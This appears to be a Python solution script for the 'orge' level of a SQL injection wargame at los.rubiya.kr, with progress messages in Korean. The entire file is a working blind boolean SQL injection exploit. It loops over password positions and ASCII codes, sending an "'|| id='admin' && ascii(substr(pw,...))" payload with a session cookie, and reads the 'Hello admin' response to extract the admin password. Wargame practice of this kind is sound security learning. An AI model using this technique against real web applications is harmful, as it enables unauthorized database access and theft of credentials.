#import urllib
import requests

url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=2"
passid =  {'PHPSESSID': 'un10edfhs1nohl7bc762fp1upq'}
flag = ""

for pw_value in range(1,9):
    for ascii in range(48,128):
          value ="'|| id='admin' && ascii(substr(pw,{},1))= {} #".format(pw_value,ascii)
          params = {'pw': value} 
          response = requests.get(url, params=params, cookies=passid)
          if 'Hello admin' in response.text :
            print(pw_value,"번째 pw의 값 : ",chr(ascii))
            flag+=chr(ascii)
            break
          print(pw_value,"번째 값 찾는중 : ",chr(ascii))
print("pw : ",flag)
